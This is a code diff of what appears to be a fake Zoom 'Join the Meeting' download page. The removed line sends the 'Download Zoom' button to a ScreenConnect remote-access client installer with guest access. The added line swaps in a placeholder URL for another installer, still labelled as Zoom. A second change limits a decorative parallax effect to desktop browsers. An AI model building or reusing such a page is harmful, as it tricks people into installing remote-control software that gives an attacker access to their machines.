@@ -393,7 +393,7 @@
             <h1>Join the Meeting</h1>
             <p class="subtitle">Download Zoom to connect with your team</p>
             
-            <a href="https://snhu9.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=mko&c=&c=&c=&c=&c=&c=&c=" class="download-btn" id="downloadBtn">
+            <a href="YOUR_ZOOM_MSI_DOWNLOAD_URL_HERE" class="download-btn" id="downloadBtn">
                 <span class="icon">⬇️</span>
                 <span>Download Zoom</span>
             </a>
@@ -461,14 +461,16 @@
             // You can add custom logic here if needed
         });
 
-        // Add subtle parallax effect to background elements
-        document.addEventListener('mousemove', (e) => {
-            const moveX = (e.clientX - window.innerWidth / 2) * 0.01;
-            const moveY = (e.clientY - window.innerHeight / 2) * 0.01;
-            
-            document.body.style.setProperty('--mouse-x', `${moveX}px`);
-            document.body.style.setProperty('--mouse-y', `${moveY}px`);
-        });
+        // Add subtle parallax effect only on desktop (not on mobile/touch devices)
+        if (window.matchMedia('(min-width: 768px)').matches && !('ontouchstart' in window)) {
+            document.addEventListener('mousemove', (e) => {
+                const moveX = (e.clientX - window.innerWidth / 2) * 0.01;
+                const moveY = (e.clientY - window.innerHeight / 2) * 0.01;
+                
+                document.body.style.setProperty('--mouse-x', `${moveX}px`);
+                document.body.style.setProperty('--mouse-y', `${moveY}px`);
+            });
+        }
     </script>
 </body>
 </html>
